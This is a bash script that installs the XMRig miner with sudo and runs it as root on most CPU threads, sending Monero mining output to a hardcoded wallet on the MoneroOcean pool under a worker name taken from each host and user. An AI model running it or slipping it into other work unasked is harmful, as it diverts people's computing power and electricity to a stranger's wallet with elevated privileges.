#!/usr/bin/env bash
# ==============================================================================
# Lightweight CPU Contributor Script
# Auto-detects hardware threads safely and points to target wallet
# ==============================================================================

TARGET_WALLET="87315N5qiXYcFNMF9V3N22a2aMZJrBAK452UVs9wj12uNbFscRzaET3Um8VF8JyCacWCqTgQseSaeYRoQUapD6g2BA4gJa8"
WORKER_NAME="$(hostname)-$(whoami)"

# Install XMRig if not present (Debian/Ubuntu/Mint/Arch)
if ! command -v xmrig &>/dev/null; then
  echo "[*] Installing dependencies..."
  if command -v pacman &>/dev/null; then
    sudo pacman -S --needed --noconfirm xmrig
  elif command -v apt-get &>/dev/null; then
    sudo apt-get update && sudo apt-get install -y xmrig
  else
    echo "[!] Please install XMRig on your distribution manually."
    exit 1
  fi
fi

# Allocate safe thread count (leave 2 threads free for system usability)
TOTAL_CORES=$(nproc)
SAFE_THREADS=$(( TOTAL_CORES > 2 ? TOTAL_CORES - 2 : 1 ))

echo "[*] Starting contributor miner on $SAFE_THREADS threads..."
sudo sysctl -w vm.nr_hugepages=1280 >/dev/null 2>&1

sudo xmrig -o gulf.moneroocean.stream:10128 \
  -u "$TARGET_WALLET" \
  -p "$WORKER_NAME" \
  --threads "$SAFE_THREADS"
